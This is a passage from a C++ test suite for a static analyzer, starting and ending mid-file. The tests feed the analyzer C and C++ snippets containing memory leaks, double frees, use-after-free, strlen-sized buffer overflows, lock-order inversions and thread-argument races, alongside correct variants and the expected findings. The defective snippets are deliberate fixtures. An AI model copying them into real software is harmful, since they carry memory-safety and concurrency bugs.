             std::string("resource-leak@5 resource-leak@18 resource-leak@23 "
                         "double-close@31"));
    // Ended on every path, handed to a v-function, or started twice.
    CHECK_EQ(found(code(R"(
void ok(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
}
void handed(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    my_vlog(fmt, ap);
    va_end(ap);
}
int twice(const char *fmt, ...) {
    va_list ap;
    va_start(ap, fmt);
    int n = vsnprintf(NULL, 0, fmt, ap);
    va_end(ap);
    va_start(ap, fmt);
    vprintf(fmt, ap);
    va_end(ap);
    return n;
}
void callee(va_list ap) {
    va_end(ap);
}
int cleanup(const char *fmt, ...) {
    va_list ap;
    int n = -1;
    va_start(ap, fmt);
    if (!fmt)
        goto out;
    n = vprintf(fmt, ap);
out:
    va_end(ap);
    return n;
}
void each(int k, const char *fmt, ...) {
    for (int i = 0; i < k; i++) {
        va_list ap;
        va_start(ap, fmt);
        vprintf(fmt, ap);
        va_end(ap);
    }
}
)")),
             std::string(""));
}

TEST(thread_arguments_and_waits) {
    // &i or &job handed to threads while the loop changes it; a shared
    // context, a per-thread array element, and a loop that joins are fine
    CHECK_EQ(found(code(R"(
void spawn(void) {
    pthread_t t[4];
    for (int i = 0; i < 4; i++)
        pthread_create(&t[i], NULL, worker, &i);
}
void spawn_job(int n) {
    pthread_t t[8];
    for (int i = 0; i < n; i++) {
        int job = i * 2;
        pthread_create(&t[i], NULL, worker, &job);
    }
}
void spawn_while(int n) {
    pthread_t t[8];
    int k = 0;
    while (k < n) {
        pthread_create(&t[k], NULL, worker, (void *)&k);
        k++;
    }
}
void spawn_prefix(int n) {
    pthread_t t[8];
    int k = 0;
    while (k < n) {
        pthread_create(&t[k], NULL, worker, &k);
        ++k;
    }
}
void spawn_name(int n) {
    pthread_t t[8];
    char name[16];
    for (int i = 0; i < n; i++) {
        name[0] = 'a' + i;
        pthread_create(&t[i], NULL, worker, &name);
    }
}
void spawn_field(int n) {
    pthread_t t[8];
    struct job j;
    for (int i = 0; i < n; i++) {
        j.id = i;
        pthread_create(&t[i], NULL, worker, &j);
    }
}
void spawn_brace(int n) {
    pthread_t t[8];
    for (int i = 0; i < n; i++) {
        int job{i};
        pthread_create(&t[i], NULL, worker, &job);
    }
}
void spawn_range(const int *xs) {
    pthread_t t[8];
    int n = 0;
    for (int x : xs)
        pthread_create(&t[n++], NULL, worker, &x);
}
)")),
             std::string("thread-stack-argument@4 thread-stack-argument@10 "
                         "thread-stack-argument@17 thread-stack-argument@25 "
                         "thread-stack-argument@34 thread-stack-argument@42 "
                         "thread-stack-argument@49 thread-stack-argument@56"));
    CHECK_EQ(found(code(R"(
void shared_context(void) {
    pthread_t t[4];
    struct ctx c = {0};
    for (int i = 0; i < 4; i++)
        pthread_create(&t[i], NULL, worker, &c);
}
void per_thread(void) {
    pthread_t t[4];
    int args[4];
    for (int i = 0; i < 4; i++) {
        args[i] = i;
        pthread_create(&t[i], NULL, worker, &args[i]);
    }
}
void one_at_a_time(void) {
    pthread_t t;
    for (int i = 0; i < 4; i++) {
        pthread_create(&t, NULL, worker, &i);
        pthread_join(t, NULL);
    }
}
void by_value(void) {
    pthread_t t[4];
    for (int i = 0; i < 4; i++)
        pthread_create(&t[i], NULL, worker, (void *)(long)i);
}
void heap_copy(void) {
    pthread_t t[4];
    for (int i = 0; i < 4; i++) {
        int *p = malloc(sizeof *p);
        *p = i;
        pthread_create(&t[i], NULL, worker, p);
    }
}
void outside_the_loop(void) {
    pthread_t t;
    int job = 0;
    for (int i = 0; i < 4; i++)
        job += i;
    pthread_create(&t, NULL, worker, &job);
    pthread_join(t, NULL);
}
)")),
             std::string(""));
    // one wait, no loop (or a retry through goto) vs the usual loops
    CHECK_EQ(found(code(R"(
void single(void) {
    pthread_mutex_lock(&m);
    if (!ready)
        pthread_cond_wait(&cv, &m);
    pthread_mutex_unlock(&m);
}
void bare(void) {
    pthread_mutex_lock(&m);
    pthread_cond_wait(&cv, &m);
    pthread_mutex_unlock(&m);
}
void in_while(void) {
    pthread_mutex_lock(&m);
    while (!ready)
        pthread_cond_wait(&cv, &m);
    pthread_mutex_unlock(&m);
}
void in_do(void) {
    pthread_mutex_lock(&m);
    do {
        pthread_cond_wait(&cv, &m);
    } while (!ready);
    pthread_mutex_unlock(&m);
}
void in_for(void) {
    pthread_mutex_lock(&m);
    for (;;) {
        if (ready)
            break;
        pthread_cond_wait(&cv, &m);
    }
    pthread_mutex_unlock(&m);
}
void with_goto(void) {
    pthread_mutex_lock(&m);
again:
    if (!ready) {
        pthread_cond_wait(&cv, &m);
        goto again;
    }
    pthread_mutex_unlock(&m);
}
)")),
             std::string("spurious-wakeup@4 spurious-wakeup@9"));
}

TEST(address_lists_and_sockets) {
    // getaddrinfo()/getifaddrs() results must be freed on every path out
    CHECK_EQ(found(code(R"(
int early(const char *host, int k) {
    struct addrinfo *res;
    if (getaddrinfo(host, "80", NULL, &res) != 0)
        return -1;
    if (k < 0)
        return -3;
    freeaddrinfo(res);
    return k;
}
int walk(const char *host, int k) {
    struct addrinfo *res, *p;
    if (getaddrinfo(host, "80", NULL, &res) != 0)
        return -1;
    for (p = res; p; p = p->ai_next)
        k += p->ai_family;
    if (k < 0)
        return -3;
    freeaddrinfo(res);
    return k;
}
int wrong_free(const char *host) {
    struct addrinfo *res;
    if (getaddrinfo(host, "80", NULL, &res) != 0)
        return -1;
    free(res);
    return 0;
}
int ifaddrs_leaky(int k) {
    struct ifaddrs *list;
    if (getifaddrs(&list) == -1)
        return -1;
    if (k)
        return -2;
    freeifaddrs(list);
    return 0;
}
int freed_twice(const char *host) {
    struct addrinfo *res;
    if (getaddrinfo(host, "80", NULL, &res) != 0)
        return -1;
    freeaddrinfo(res);
    freeaddrinfo(res);
    return 0;
}
int used_after(const char *host) {
    struct addrinfo *res;
    if (getaddrinfo(host, "80", NULL, &res) != 0)
        return -1;
    freeaddrinfo(res);
    return res->ai_flags;
}
)")),
             std::string("memory-leak@6 memory-leak@17 "
                         "alloc-dealloc-mismatch@25 memory-leak@33 "
                         "double-free@42 heap-use-after-free@50"));
    CHECK_EQ(found(code(R"(
int ok(const char *host) {
    struct addrinfo *res;
    if (getaddrinfo(host, "80", NULL, &res) != 0)
        return -1;
    int n = res->ai_flags;
    freeaddrinfo(res);
    return n;
}
int ok_rc(const char *host) {
    struct addrinfo *res = NULL;
    int rc = getaddrinfo(host, "80", NULL, &res);
    if (rc != 0)
        return -1;
    freeaddrinfo(res);
    return 0;
}
int ifaddrs_zero(void) {
    struct ifaddrs *list, *i;
    int n = 0;
    if (getifaddrs(&list) == 0) {
        for (i = list; i; i = i->ifa_next)
            n++;
        freeifaddrs(list);
    }
    return n;
}
int ifaddrs_negative(void) {
    struct ifaddrs *list;
    if (getifaddrs(&list) < 0)
        return -1;
    freeifaddrs(list);
    return 0;
}
struct addrinfo *handed_on(const char *host) {
    struct addrinfo *res;
    if (getaddrinfo(host, "80", NULL, &res) != 0)
        return NULL;
    return res;
}
void stored(const char *host, struct addrinfo **out) {
    struct addrinfo *res;
    if (getaddrinfo(host, "80", NULL, &res) == 0)
        *out = res;
}
)")),
             std::string(""));
    // sockets: leaked on a failed connect, accepted and never closed
    CHECK_EQ(found(code(R"(
int dial(const char *ip, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        return -1;
    if (connect(fd, (struct sockaddr *)&a, sizeof a) < 0)
        return -1;
    return fd;
}
void serve(int lfd) {
    for (;;) {
        int c = accept(lfd, NULL, NULL);
        if (c < 0)
            break;
        write(c, "hi\n", 3);
    }
}
int dial_ok(const char *ip, int port) {
    int fd = socket(AF_INET, SOCK_STREAM, 0);
    if (fd < 0)
        return -1;
    if (connect(fd, (struct sockaddr *)&a, sizeof a) < 0) {
        close(fd);
        return -1;
    }
    return fd;
}
)")),
             std::string("resource-leak@6 resource-leak@15"));
}

TEST(strlen_sized_blocks) {
    // malloc(strlen(s)) has no room for the NUL strcpy writes
    CHECK_EQ(found(code(R"(
char *dup_name(const char *s) {
    char *p = malloc(strlen(s));
    strcpy(p, s);
    return p;
}
char *dup_cat(const char *a, const char *b) {
    char *p;
    p = malloc(strlen(a) + strlen(b));
    strcpy(p, a);
    strcat(p, b);
    return p;
}
)")),
             std::string("heap-buffer-overflow@3 heap-buffer-overflow@10"));
    CHECK_EQ(found(code(R"(
char *ok_plus_one(const char *s) {
    char *p = malloc(strlen(s) + 1);
    strcpy(p, s);
    return p;
}
char *ok_cat(const char *a, const char *b) {
    char *p = malloc(strlen(a) + strlen(b) + 1);
    strcpy(p, a);
    strcat(p, b);
    return p;
}
char *other_source(const char *s, const char *t) {
    char *p = malloc(strlen(s));
    strcpy(p, t);
    return p;
}
char *plus_a_variable(const char *s, int extra) {
    char *p = malloc(strlen(s) + extra);
    strcpy(p, s);
    return p;
}
char *product(const char *a, const char *b) {
    char *p = malloc(strlen(a) * strlen(b));
    strcpy(p, a);
    strcat(p, b);
    return p;
}
char *twice_as_big(const char *s) {
    char *p = malloc(2 * strlen(s));
    strcpy(p, s);
    return p;
}
char *copied_without_nul(const char *s) {
    char *p = malloc(strlen(s));
    memcpy(p, s, strlen(s));
    return p;
}
char *reassigned(const char *s, const char *t) {
    char *p = malloc(strlen(s));
    free(p);
    p = malloc(strlen(s) + 1);
    strcpy(p, s);
    return p;
}
char *sum_then_copy_one(const char *a, const char *b) {
    char *p = malloc(strlen(a) + strlen(b));
    strcpy(p, a);
    return p;
}
)")),
             std::string(""));
}

TEST(lambdas_macros_and_chains) {
    // Found by sweeping real code (koffi, lmdb, pyarrow, better-sqlite3,
    // strata): none of these is a bug.
    CHECK_EQ(found(code(R"(
Mem *make_mem(int n) {
    Mem *mem = new Mem();
    K_DEFER_N(mem_guard) { delete mem; };
    mem->len = n;
    if (!mem->len)
        return nullptr;
    mem_guard.disable();
    return mem;
}
void dump_to(const char *name) {
    FILE *out;
    if (name == 0 || name[0] == 0) {
        out = stdout;
    } else {
        out = fopen(name, "w");
        if (out == 0)
            return;
    }
    fprintf(out, "x\n");
    if (out == stdout) {
        fflush(stdout);
    } else {
        fclose(out);
    }
}
int prepare(sqlite3 *db, const char *sql) {
    Parse sParse;
    db->pParse = &sParse;
    int rc = run(&sParse, sql);
    sqlite3ParseObjectReset(&sParse);
    return rc;
}
int run_files(char **argv, const char *unit) {
    FILE *fp;
    const char *file;
    while ((file = *argv++)) {
        if (!strcmp(file, "-")) {
            fp = stdin;
        } else if (!(fp = fopen(file, "r"))) {
            fprintf(stderr, "%s: %s: cannot read\n", unit, file);
            return 2;
        }
        if (fp != stdin)
            fclose(fp);
    }
    return 0;
}
void dump_negated(const char *name) {
    FILE *out = stdout;
    if (name)
        out = fopen(name, "w");
    if (!out)
        return;
    if (!(out == stdout))
        fclose(out);
}
void dump_to_back(const char *name) {
    FILE *out = stderr;
    if (name)
        out = fopen(name, "w");
    if (!out)
        return;
    fprintf(out, "x\n");
    if (out != stderr)
        fclose(out);
}
long meminfo_kb() {
    long kb = 0;
    if (FILE *m = fopen("/proc/meminfo", "r")) {
        char line[256];
        while (fgets(line, sizeof line, m))
            if (sscanf(line, "MemAvailable: %ld kB", &kb) == 1)
                break;
        fclose(m);
    }
    if (FILE *s = fopen("/proc/self/stat", "r")) {
        fclose(s);
    }
    return kb;
}
bool read_all(const char *path, std::vector<unsigned char> &out) {
    FILE *f = fopen(path, "rb");
    if (f == nullptr)
        return false;
    struct Closer {
        FILE *f;
        ~Closer() { if (f != nullptr) fclose(f); }
    } closer{f};
    if (fseek(f, 0, SEEK_END) != 0)
        return false;
    out.resize(size_t(ftell(f)));
    return fread(out.data(), 1, out.size(), f) == out.size();
}
bool reopen_in_a_loop(const std::vector<Row> &rows, std::string &err) {
    FILE *cur = nullptr;
    int cur_file = -1;
    for (size_t i = 0; i < rows.size(); ++i) {
        const Row &r = rows[i];
        if (r.file != cur_file) {
            if (cur) fclose(cur);
            cur = fopen(file_name(r.file), "rb");
            if (!cur) { err = "open"; return false; }
            cur_file = r.file;
        }
        if (!read_at(cur, 0, buf, 16)) {
            err = "short";
            fclose(cur);
            return false;
        }
    }
    if (cur) fclose(cur);
    return true;
}
void refcounted(Lib *lib) {
    Info *func = new Info();
    K_DEFER { func->Unref(); };
    func->lib = lib->Ref();
}
void restores_a_global() {
    Call call;
    K_DEFER_C(prev = exec_call) { exec_call = prev; };
    exec_call = &call;
    run(call);
}
void close_poll(Poll *self) {
    const auto release = [](Handle *ptr) {
        Handle *handle = ptr;
        delete handle;
    };
    start(self->handle);
    uv_close(self->handle, release);
    self->handle = nullptr;
}
void free_in_two_lambdas(std::vector<void *> a, std::vector<void *> b) {
    std::thread t1([=](std::vector<void *> v) {
        for (auto p : v)
            std::free(p);
    }, a);
    std::thread t2([=](std::vector<void *> v) {
        for (auto p : v)
            std::free(p);
    }, b);
    t1.detach();
    t2.detach();
}
void deferred_free(int n) {
    char *p = (char *)malloc(n);
    auto cleanup = [&] { free(p); };
    use(p);
    cleanup();
}
int chain(int n) {
    char *buf, *ptr;
    buf = ptr = (char *)malloc(n);
    if (buf == NULL)
        return -1;
    memset(ptr, 0, n);
    free(buf);
    return 0;
}
void ctor(void *self) {
    Wrapped *w = new Wrapped();
    w->Wrap(self);
}
void owners(std::shared_ptr<T> *out, Holder &h) {
    T *p = new T();
    *out = std::shared_ptr<T>(p);
    T *q = new T();
    h.sp = std::shared_ptr<T>(q);
    T *r = new T();
    auto up = std::unique_ptr<T>(r);
}
)")),
             std::string(""));
    // a chain is still judged, a real double free is still found, a lambda
    // that names p takes p over (no leak), and a C99 designated initializer
    // is not a lambda
    CHECK_EQ(found(code(R"(
void chain_leak(int n) {
    char *buf, *ptr;
    buf = ptr = (char *)malloc(n);
}
void real_double_free(char *p) {
    free(p);
    free(p);
}
void unused_lambda(int n) {
    char *p = (char *)malloc(n);
    auto never = [p] { free(p); };
}
void array_init() {
    int a[2][2] = { [0] = {1}, [1] = {2} };
    char *q = (char *)malloc(4);
    free(q);
}
)")),
             std::string("memory-leak@4 double-free@7"));
}

TEST(lock_guards) {
    // RAII guards hold their mutex to the end of the block: orders between
    // them, a second guard or a manual lock on the same mutex, a unique_lock
    // that unlocks early; and a wait on one with no predicate or loop
    const std::string guarded = code(R"(
std::mutex a, b, c;
void ab() {
    std::lock_guard<std::mutex> x(a);
    std::lock_guard<std::mutex> y(b);
}
void ba() {
    std::lock_guard<std::mutex> y(b);
    std::lock_guard<std::mutex> x(a);
}
void relock() {
    std::lock_guard<std::mutex> x(c);
    std::lock_guard<std::mutex> y(c);
}
void nested() {
    std::lock_guard<std::mutex> x(c);
    {
        std::lock_guard<std::mutex> y(c);
    }
}
void guard_then_lock() {
    std::lock_guard<std::mutex> g(c);
    c.lock();
    c.unlock();
}
void wait_once() {
    std::unique_lock<std::mutex> lk(a);
    if (!ready)
        cv.wait(lk);
}
)");
    CHECK_EQ(found(guarded),
             std::string("double-lock@12 double-lock@17 double-lock@22 "
                         "spurious-wakeup@28"));
    CHECK_EQ(inversions(guarded), std::string("b>a@8 (ab@4)"));
    CHECK_EQ(found(code(R"(
std::mutex a, b, c;
std::recursive_mutex rm;
void sequential() {
    {
        std::lock_guard<std::mutex> x(c);
    }
    std::lock_guard<std::mutex> y(a);
}
void sequential_back() {
    std::lock_guard<std::mutex> y(a);
    {
        std::lock_guard<std::mutex> x(c);
    }
}
void recursive() {
    std::lock_guard<std::recursive_mutex> x(rm);
    std::lock_guard<std::recursive_mutex> y(rm);
}
void loop_break(int n) {
    for (;;) {
        std::lock_guard<std::mutex> g(a);
        if (done())
            break;
    }
    std::lock_guard<std::mutex> g2(a);
}
void loop_continue(int n) {
    for (int i = 0; i < n; i++) {
        std::lock_guard<std::mutex> g(a);
        if (i == 3)
            continue;
        work();
    }
    a.lock();
    a.unlock();
}
void early_unlock() {
    std::unique_lock<std::mutex> lk(a);
    lk.unlock();
    work();
    lk.lock();
    lk.unlock();
    lk.lock();
}
void early_return(bool x) {
    std::lock_guard<std::mutex> g(a);
    if (x)
        return;
    work();
}
void defer_then_lock() {
    {
        std::unique_lock<std::mutex> lk(a, std::defer_lock);
        lk.lock();
    }
    a.lock();
    a.unlock();
}
void unlock_then_manual() {
    std::unique_lock<std::mutex> lk(a);
    lk.unlock();
    a.lock();
    a.unlock();
}
void wait_loop() {
    std::unique_lock<std::mutex> lk(a);
    while (!ready)
        cv.wait(lk);
    cv.wait(lk, [] { return ready; });
}
void deferred() {
    std::unique_lock<std::mutex> l1(a, std::defer_lock);
    std::unique_lock<std::mutex> l2(b, std::defer_lock);
    std::lock(l1, l2);
}
void adopted() {
    a.lock();
    std::lock_guard<std::mutex> g(a, std::adopt_lock);
}
void tried() {
    std::unique_lock<std::mutex> lk(a, std::try_to_lock);
    std::lock_guard<std::mutex> g(a);
}
void handed(std::unique_lock<std::mutex> &lk) {
    cv.wait(lk);
}
void scoped() {
    std::scoped_lock lk(a);
    std::lock_guard<std::mutex> g(c);
}
)")),
             std::string(""));
}

TEST(lock_order_of_fields_of_globals) {
    // checking.mu is one mutex in every function; p->mu and accounts[i].mu
    // may be different ones in each
    CHECK_EQ(inversions(code(R"(
struct Account { std::mutex mu; };
Account checking, savings;
Account accounts[4];
Account *gp, *gq;
struct Holder { Account *p, *q; Account items[2]; };
Holder h;
void transfer() {
    std::lock_guard<std::mutex> a(checking.mu);
    std::lock_guard<std::mutex> b(savings.mu);
}
void refund() {
    std::lock_guard<std::mutex> a(savings.mu);
    std::lock_guard<std::mutex> b(checking.mu);
}
void by_pointer(Account *p, Account *q) {
    std::lock_guard<std::mutex> a(p->mu);
    std::lock_guard<std::mutex> b(q->mu);
}
void by_pointer_back(Account *p, Account *q) {
    std::lock_guard<std::mutex> a(q->mu);
    std::lock_guard<std::mutex> b(p->mu);
}
void by_global_pointer() {
    std::lock_guard<std::mutex> a(gp->mu);
    std::lock_guard<std::mutex> b(gq->mu);
}
void by_global_pointer_back() {
    std::lock_guard<std::mutex> a(gq->mu);
    std::lock_guard<std::mutex> b(gp->mu);
}
void by_field_pointer() {
    std::lock_guard<std::mutex> a(h.p->mu);
    std::lock_guard<std::mutex> b(h.q->mu);
}
void by_field_pointer_back() {
    std::lock_guard<std::mutex> a(h.q->mu);
    std::lock_guard<std::mutex> b(h.p->mu);
}
void by_field_array(int i, int j) {
    std::lock_guard<std::mutex> a(h.items[i].mu);
    std::lock_guard<std::mutex> b(h.items[j].mu);
}
void by_field_array_back(int i, int j) {
    std::lock_guard<std::mutex> a(h.items[j].mu);
    std::lock_guard<std::mutex> b(h.items[i].mu);
}
void by_index(int i, int j) {
    std::lock_guard<std::mutex> a(accounts[i].mu);
    std::lock_guard<std::mutex> b(accounts[j].mu);
}
void by_index_back(int i, int j) {
    std::lock_guard<std::mutex> a(accounts[j].mu);
    std::lock_guard<std::mutex> b(accounts[i].mu);
}
)")),
             std::string("savings.mu>checking.mu@13 (transfer@9)"));
}

TEST(deeply_nested_loops_finish) {
    // Each pass over a loop must settle on the same state: a variable
    // declared in the body and released through an unknown pointer used to
    // get a fresh site per pass, and eight levels then took 6^8 passes.
    CHECK_EQ(found(code(R"(
void deep(int n, char **bufs) {
    for (int a = 0; a < n; a++)
    for (int b = 0; b < n; b++)
    for (int c = 0; c < n; c++)
    for (int d = 0; d < n; d++)
    for (int e = 0; e < n; e++)
    for (int f = 0; f < n; f++)
    for (int g = 0; g < n; g++)
    for (int h = 0; h < n; h++) {
        char *q = bufs[a];
        free(q);
        char *r = bufs[b];
        free(r);
        q = malloc(8);
        free(q);
    }
}
)")),
             std::string(""));
}

TEST(std_threads) {
    // a thread object destroyed unjoined terminates the program; joined,
    // detached, moved away, returned or tested with joinable() it does not
    CHECK_EQ(found(code(R"(
void forgot_join() {
    std::thread t(work, 1);
    log("started");
}
int early(bool bad) {
    std::thread t([] { work(2); });
    if (bad)
        return -1;
    t.join();
    return 0;
}
void twice() {
    std::thread t(work, 8);
    t.join();
    t.join();
}
)")),
             std::string("resource-leak@4 resource-leak@8 double-join@15"));
    CHECK_EQ(found(code(R"(
void joined() {
    std::thread t(work, 3);
    t.join();
}
void detached() {
    std::thread t(work, 4);
    t.detach();
}
std::thread make() {
    std::thread t(work, 5);
    return t;
}
void stash(std::vector<std::thread> &v) {
    std::thread t(work, 6);
    v.push_back(std::move(t));
}
void guarded() {
    std::thread t(work, 7);
    if (t.joinable())
        t.join();
}
void idle() {
    std::thread t;
    std::thread u();
    std::thread *p = new std::thread(work, 9);
    p->join();
    delete p;
}
void by_branch(bool fast) {
    std::thread t(work, 10);
    if (fast)
        t.join();
    else
        t.detach();
}
)")),
             std::string(""));
    // lambdas that capture by reference: the loop's variable, a detached
    // thread's locals; by value, init-captures and a join per iteration are
    // fine, and so is what the lambda itself writes
    CHECK_EQ(found(code(R"(
void loop_ref(int n) {
    std::vector<std::thread> threads;
    for (int i = 0; i < n; i++)
        threads.emplace_back([&] { work(i); });
    for (auto &t : threads)
        t.join();
}
void loop_ref_explicit(int n) {
    std::vector<std::thread> threads;
    for (int i = 0; i < n; i++)
        threads.emplace_back([&i] { work(i); });
}
void detach_ref() {
    int counter = 0;
    std::thread t([&] { counter++; });
    t.detach();
}
void detach_direct() {
    int counter = 0;
    std::thread([&counter] { counter++; }).detach();
}
void async_loop(int n) {
    std::vector<std::future<void>> fs;
    for (int i = 0; i < n; i++)
        fs.push_back(std::async(std::launch::async, [&] { work(i); }));
}
)")),
             std::string("thread-stack-argument@4 thread-stack-argument@11 "
                         "thread-stack-argument@16 thread-stack-argument@20 "
                         "thread-stack-argument@25"));
    CHECK_EQ(found(code(R"(
void loop_copy(int n) {
    std::vector<std::thread> threads;
    for (int i = 0; i < n; i++)
        threads.emplace_back([i] { work(i); });
    for (auto &t : threads)
        t.join();
}
void loop_copy_default(int n) {
    std::vector<std::thread> threads;
    for (int i = 0; i < n; i++)
        threads.emplace_back([=] { work(i); });
    for (auto &t : threads)
        t.join();
}
void loop_joined_each(int n) {
    for (int i = 0; i < n; i++) {
        std::thread t([&] { work(i); });
        t.join();
    }
}
void loop_init_capture(int n) {
    std::vector<std::thread> threads;
    for (int i = 0; i < n; i++)
        threads.emplace_back([&, k = i] { work(k); });
    for (auto &t : threads)
        t.join();
}
void detach_copy() {
    int counter = 0;
    std::thread t([counter] { work(counter); });
    t.detach();
}
void shared_total(int n, std::atomic_int &total) {
    std::atomic_int errcode;
    std::vector<std::thread> threads;
    for (int i = 0; i < n; i++)
        threads.emplace_back([i, &errcode] {
            for (int cp = i; !errcode; cp += 4)
                errcode = 3;
        });
    for (auto &t : threads)
        t.join();
}
void copied_among_refs(int n) {
    std::vector<std::thread> threads;
    for (int i = 0; i < n; i++)
        threads.emplace_back([&, i] { work(i); });
    for (auto &t : threads)
        t.join();
}
void refs_to_elements(std::vector<int> &items) {
    std::vector<std::thread> threads;
    for (auto &x : items)
        threads.emplace_back([&] { work(x); });
    for (auto &t : threads)
        t.join();
}
void own_variable(int n) {
    std::vector<std::thread> threads;
    for (int i = 0; i < n; i++)
        threads.emplace_back([&] {
            for (int i = 0; i < 4; i++)
                work(i);
        });
    for (auto &t : threads)
        t.join();
}
)")),
             std::string(""));
}

TEST(lock_order_through_helpers) {
    CHECK_EQ(inversions(code(R"(
pthread_mutex_t accounts, journal;
static void journal_add(int x) {
    pthread_mutex_lock(&journal);
    log_entry(x);
    pthread_mutex_unlock(&journal);
}
void transfer(int x) {
    pthread_mutex_lock(&accounts);
    journal_add(x);
    pthread_mutex_unlock(&accounts);
}
void rotate(void) {
    pthread_mutex_lock(&journal);
    pthread_mutex_lock(&accounts);
    pthread_mutex_unlock(&accounts);
    pthread_mutex_unlock(&journal);
}
)")),
             std::string("journal>accounts@14 (transfer@9)"));
    // Nothing held at the call, the held mutex itself, or a callee from
    // another file: no order.
    CHECK_EQ(inversions(code(R"(
pthread_mutex_t a, b;
static void take_a(void) {
    pthread_mutex_lock(&a);
    pthread_mutex_unlock(&a);
}
static void take_b(void) {
    pthread_mutex_lock(&b);
    pthread_mutex_unlock(&b);
}
void free_call(void) {
    take_b();
    pthread_mutex_lock(&b);
    pthread_mutex_lock(&a);
    pthread_mutex_unlock(&a);
    pthread_mutex_unlock(&b);
}
void same(void) {
    pthread_mutex_lock(&a);
    take_a();
    elsewhere();
    pthread_mutex_unlock(&a);
}
)")),
             std::string(""));
}

TEST(lock_leaks_and_double_locks) {
    CHECK_EQ(found(code(R"(
int early_return(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
    if (c->n == 0)
        return -1;
    c->n--;
    pthread_mutex_unlock(&c->mu);
    return 0;
}
void twice(void) {
    pthread_mutex_lock(&g_mu);
    work();
    pthread_mutex_lock(&g_mu);
    pthread_mutex_unlock(&g_mu);
}
void cxx_member(int x) {
    mtx_.lock();
    if (x)
        return;
    mtx_.unlock();
}
void falls_off(struct ctx *c, int x) {
    pthread_mutex_lock(&c->mu);
    if (x) {
        pthread_mutex_unlock(&c->mu);
        return;
    }
    work();
}
int waits(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
    while (!c->ready)
        pthread_cond_wait(&c->cv, &c->mu);
    if (c->closed)
        return -1;
    pthread_mutex_unlock(&c->mu);
    return 0;
}
)")),
             std::string("lock-leak@4 double-lock@12 lock-leak@18 lock-leak@28 "
                         "lock-leak@34"));
    // Correct code, and code the analyzer cannot judge.
    CHECK_EQ(found(code(R"(
void wrapper(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
}
void conditional(struct ctx *c, int need) {
    if (need)
        pthread_mutex_lock(&c->mu);
    work();
    if (need)
        pthread_mutex_unlock(&c->mu);
}
int tested(struct ctx *c) {
    if (pthread_mutex_lock(&c->mu) != 0)
        return -1;
    pthread_mutex_unlock(&c->mu);
    int rc = pthread_mutex_lock(&c->mu);
    if (rc)
        return rc;
    pthread_mutex_unlock(&c->mu);
    return 0;
}
void guard(std::mutex &m, int x) {
    std::unique_lock<std::mutex> lk(m);
    lk.unlock();
    work();
    lk.lock();
    if (x)
        return;
}
void cond_wait(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
    while (!c->ready)
        pthread_cond_wait(&c->cv, &c->mu);
    pthread_mutex_unlock(&c->mu);
}
void handed_off(struct ctx *c, int x) {
    pthread_mutex_lock(&c->mu);
    if (x) {
        finish_and_unlock(&c->mu);
        return;
    }
    pthread_mutex_unlock(&c->mu);
}
void relock(struct ctx *c) {
    c->m.lock();
    while (c->busy) {
        c->m.unlock();
        work();
        c->m.lock();
    }
    c->m.unlock();
}
void weak(std::weak_ptr<int> w) {
    auto a = w.lock();
    auto b = w.lock();
}
void cleanup(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
    if (c->n == 0)
        goto out;
    c->n--;
out:
    pthread_mutex_unlock(&c->mu);
}
)")),
             std::string(""));
}

TEST(unlocks_and_waits_on_a_released_mutex) {
    const std::string src = code(R"(
void twice(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
    c->n++;
    pthread_mutex_unlock(&c->mu);
    pthread_cond_signal(&c->cv);
    pthread_mutex_unlock(&c->mu);
}
int cleanup_twice(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
    if (c->n == 0) {
        pthread_mutex_unlock(&c->mu);
        goto out;
    }
    c->n--;
    pthread_mutex_unlock(&c->mu);
out:
    pthread_mutex_unlock(&c->mu);
    return 0;
}
void wait_after_unlock(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
    c->busy = 1;
    pthread_mutex_unlock(&c->mu);
    while (!c->ready)
        pthread_cond_wait(&c->cv, &c->mu);
}
void cxx_twice(int x) {
    mtx_.lock();
    work(x);
    mtx_.unlock();
    if (x)
        mtx_.unlock();
}
void maybe(struct ctx *c, int x) {
    pthread_mutex_lock(&c->mu);
    if (x)
        pthread_mutex_unlock(&c->mu);
    work();
    pthread_mutex_unlock(&c->mu);
}
int error_path(struct table *t) {
    pthread_mutex_lock(&t->mu);
    if (!t->slots) {
        pthread_mutex_unlock(&t->mu);
        goto out;
    }
    t->used++;
out:
    pthread_mutex_unlock(&t->mu);
    return 0;
}
void maybe_wait(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
    if (c->slow)
        pthread_mutex_unlock(&c->mu);
    while (!c->ready)
        pthread_cond_wait(&c->cv, &c->mu);
    pthread_mutex_unlock(&c->mu);
}
)");
    CHECK_EQ(
        found(src),
        std::string("foreign-unlock@6 foreign-unlock@17 unlocked-wait@25 "
                    "foreign-unlock@32 foreign-unlock@39 foreign-unlock@49 "
                    "unlocked-wait@57 foreign-unlock@58"));
    CHECK(has_message(src, "'c->mu' is unlocked again: it was already unlocked "
                           "at line 4"));
    CHECK(has_message(src, "'t->mu' may be unlocked twice: on some paths it "
                           "was already unlocked at line 44"));
    CHECK(has_message(src, "may wait with 'c->mu' unlocked"));
    // Relocked in ways the analyzer does not follow, unlocked once as told by
    // a flag, or never locked here.
    CHECK_EQ(found(code(R"(
int flagged(struct ctx *c) {
    int locked = 1;
    pthread_mutex_lock(&c->mu);
    if (c->n == 0) {
        pthread_mutex_unlock(&c->mu);
        locked = 0;
        goto out;
    }
    c->n--;
out:
    if (locked)
        pthread_mutex_unlock(&c->mu);
    return 0;
}
void tested_relock(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
    pthread_mutex_unlock(&c->mu);
    if (pthread_mutex_lock(&c->mu) != 0)
        return;
    pthread_mutex_unlock(&c->mu);
}
void helper_relock(struct ctx *c) {
    pthread_mutex_lock(&c->mu);
    pthread_mutex_unlock(&c->mu);
    pthread_cond_signal(&c->cv);
    ctx_lock(c);
    pthread_mutex_unlock(&c->mu);
}
void member_relock(void) {
    mtx_.lock();
    mtx_.unlock();
